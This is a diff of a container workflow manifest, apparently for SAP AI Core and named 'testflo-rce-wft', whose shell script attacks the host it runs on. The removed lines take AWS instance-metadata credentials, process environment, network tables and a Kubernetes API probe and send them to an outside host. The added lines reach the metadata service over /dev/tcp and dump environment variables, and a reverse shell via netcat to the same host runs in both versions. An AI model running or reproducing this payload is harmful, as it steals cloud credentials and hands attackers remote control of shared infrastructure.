@@ -11,40 +11,31 @@ metadata:
     executables.ai.sap.com/id: testflo-rce-wft
     executables.ai.sap.com/name: testflo-rce-wft
     ai.sap.com/version: "1.0.0"
-    ai.sap.com/resourcePlan: starter
+    ai.sap.com/resourcePlan: infer.s
 spec:
   entrypoint: cb
   templates:
     - name: cb
+      metadata:
+        labels:
+          ai.sap.com/resourcePlan: infer.s
       container:
         image: alpine:3.19
         command:
           - sh
           - -c
           - |
-            apk add --no-cache curl 2>/dev/null
-            # IMDSv2
-            IMDS_TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" \
-              -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --max-time 5) || true
-            if [ -n "$IMDS_TOKEN" ]; then
-              ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --max-time 5)
-              curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" \
-                --max-time 5 -o /tmp/imds_creds.txt
-              curl -sf --data-binary @/tmp/imds_creds.txt "https://sfg.0x79.de/cb?t=TESTFLO-IMDS-CREDS" || true
-            else
-              curl -sf "https://sfg.0x79.de/cb?t=TESTFLO-IMDS-FAIL" || true
-            fi
-            # proc recon
-            ENV1=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -v 'TOKEN\|SECRET\|PASS\|KEY' | head -50)
-            curl -sf --data-urlencode "d=${ENV1}" "https://sfg.0x79.de/cb?t=TESTFLO-PROC1-ENV" || true
-            ARP=$(cat /proc/net/arp 2>/dev/null)
-            curl -sf --data-urlencode "d=${ARP}" "https://sfg.0x79.de/cb?t=TESTFLO-ARP" || true
-            TCP=$(cat /proc/net/tcp 2>/dev/null | head -30)
-            curl -sf --data-urlencode "d=${TCP}" "https://sfg.0x79.de/cb?t=TESTFLO-TCP" || true
-            # k8s API unauthenticated probe
-            KAPI=$(curl -sk https://kubernetes.default.svc/api/v1/namespaces --max-time 5 2>/dev/null | head -c 500)
-            curl -sf --data-urlencode "d=${KAPI}" "https://sfg.0x79.de/cb?t=TESTFLO-KUBE-API" || true
+            # node info
+            echo "hostname: $(hostname)"
+            cat /proc/version 2>/dev/null
+            cat /sys/devices/virtual/dmi/id/product_name 2>/dev/null || true
+            # IMDS via /dev/tcp (bypasses curl requirement, goes direct)
+            exec 3<>/dev/tcp/169.254.169.254/80
+            printf "PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n" >&3
+            IMDS_RESP=$(cat <&3)
+            exec 3>&-
+            echo "IMDS_RESP: $IMDS_RESP"
+            # env recon
+            env | grep -v 'TOKEN\|SECRET\|PASS\|KEY'
             # reverse shell
             nc sfg.0x79.de 8080 -e /bin/sh || true
